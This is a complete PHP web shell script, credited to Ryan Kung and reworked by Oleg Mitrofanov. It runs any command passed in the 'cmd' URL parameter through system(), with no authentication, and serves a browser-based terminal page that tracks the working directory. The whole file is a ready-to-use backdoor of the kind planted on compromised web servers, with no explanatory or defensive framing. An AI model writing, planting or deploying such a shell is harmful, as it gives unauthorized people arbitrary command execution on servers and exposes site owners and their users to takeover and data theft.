<?php

#
# Originally script comes from Ryan Kung --
# https://gist.github.com/RyanKung/3369063
#
# This is a reworked version by Oleg Mitrofanov, 2015.
# Tested to be functional on both Windows and Linux.
#

# HELPER FUNCTIONS BEGIN

function is_windows() {
    if (stristr(php_uname('s'), "WIN")) {
        return true;
    }

    return false;
}

function show_prompt() {
    $user = trim($_SESSION['user']);
    $host = trim($_SESSION['host']);
    $path = trim($_SESSION['path']);
    if (is_windows()) {
        echo "$user@$host&lt;$path&gt;"; 
    } else {
        echo "$user@$host:$path" . '$';        
    }
}

# HELPER FUNCTIONS END

session_start();

# If this is the first time the page is requested
if (empty($_SESSION['path'])) {
    if (is_windows())
    {
        $user = shell_exec('echo %username%');
        $host = shell_exec('echo %userdomain%');
    } else {
        $user = shell_exec('whoami');
        $host = shell_exec('hostname');
    }

    $_SESSION['user'] = $user;
    $_SESSION['host'] = $host;
    $_SESSION['path'] = getcwd();
}

chdir($_SESSION['path']);

if (!empty($_GET['cmd'])) {
    $cmd =  $_GET['cmd'];
    if (preg_match("/^cd (.*)/i", $cmd, $file)) {
        $returnval = chdir($file[1]);
        $_SESSION['path'] = getcwd();
        show_prompt();
    } else {
        # passthru($cmd, $returnval);
        $output = system($cmd, $returnval);
        if ($returnval) {
            echo 'WEB SHELL: ERROR';
        } elseif ($output == NULL) {  
            echo 'WEB SHELL: NO OUTPUT';
        } 
    }

    exit;
}
?>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Web Shell</title>
    <style>
    body{background:#333;color:#88B541;}
    input{background:#444;color:#E19A49;border:0;width:50%;}
    .log-list{overflow-y:scroll;height:90%;}
    #text{color:#999;}
    b{color:#FB6D6C;}
    </style>
    <script>
    
    // Helper function for escaping special HTML chars in the output of
    // command. Relevant, e.g. for Windows dir command.
    String.prototype.escape = function() {
        var tagsToReplace = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;'
        };
        return this.replace(/[&<>]/g, function(tag) {
            return tagsToReplace[tag] || tag;
        });
    };

    postCmd = function(e) {
        e.preventDefault;
        var cmd = document.getElementById('cmd'),
            log = document.getElementById('log-item'),
            text = document.getElementById('text'),
            prompt = document.getElementById('prompt'),
            ajax = new XMLHttpRequest();
        if (!cmd.value) {return;};
        ajax.open("GET", "?cmd="+cmd.value);
        ajax.send();
        ajax.onreadystatechange = function() {
            if ( ajax.readyState == 4 ) {
                // console.log(ajax.responseText);
                if (cmd.value.match("cd ")) {
                    prompt.innerHTML = ajax.responseText;
                    console.log(prompt);
                } else {
                    var t = "<pre>%s</pre>";
                    log.innerHTML += t.replace('%s', ajax.responseText.escape());
                }
                text.scrollIntoView();
                cmd.value = "";
            }
        }
    };
    </script>
  </head>
  <body>
    <div class="log-list">
       <div id="log-item"></div>
       <span id="text">_____</span>
    </div>
    <br />
    <form action="javascript:;" method="post" onsubmit="postCmd(event)"/>
      <label id="prompt" for="cmd"><?php show_prompt();?></label>
      <input id="cmd" type="text" tab="1" autofocus="autofocus"/>
    </form>
  </body>
</html>
